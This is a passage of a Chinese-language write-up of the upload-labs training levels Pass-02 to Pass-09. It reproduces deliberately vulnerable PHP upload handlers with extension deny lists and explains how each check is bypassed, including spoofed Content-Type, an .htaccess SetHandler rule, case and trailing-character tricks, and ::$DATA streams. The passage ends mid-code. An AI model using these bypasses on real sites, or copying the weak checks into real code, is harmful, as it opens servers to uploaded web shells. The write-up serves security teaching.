class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 仅仅判断content-type，于是修改content-type(<code>image/jpeg</code>,<code>image/png</code>,<code>image/gif</code>)绕过</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在黑名单限制，利用Apache解析漏洞尝试用<code>php3</code>,<code>phtml</code>绕过 </p><p>Apache有解析漏洞，文件在<code>/etc/mime.types</code>。我在CetnOS上面安装的默认没有解析这几行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">application/x-httpd-php          phtml pht php</span><br><span class="line">application/x-httpd-php-source           phps</span><br><span class="line">application/x-httpd-php3         php3</span><br><span class="line">application/x-httpd-php3-preprocessed        php3p</span><br><span class="line">application/x-httpd-php4         php4</span><br><span class="line">application/x-httpd-php5         php5</span><br></pre></td></tr></table></figure><p>添加一行<code>phtml</code>作为测试，修改后记得<code>service httpd restart</code>或者<code>systemctl restart httpd.service</code></p><p>其他方法查看<a href="https://fuping.site/2018/06/04/upload-labs-writeup/" rel="external nofollow" target="_blank">upload-labs-writeup</a></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写文件解析规则绕过。上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;03.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后再上传一个<code>03.jpg</code>,执行上传的<code>03.jpg</code>脚本</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 文件名后缀大小写混合绕过。<code>05.php</code>改成<code>05.phP</code>然后上传 </p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 黑名单，但是没有对后缀名进行去空处理，可在后缀名中加空绕过 </p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 黑名单，但是没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Windows文件流特性绕过，文件名改成<code>08.php::$DATA</code>，上传成功后保存的文件名其实是<code>08.php</code></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span 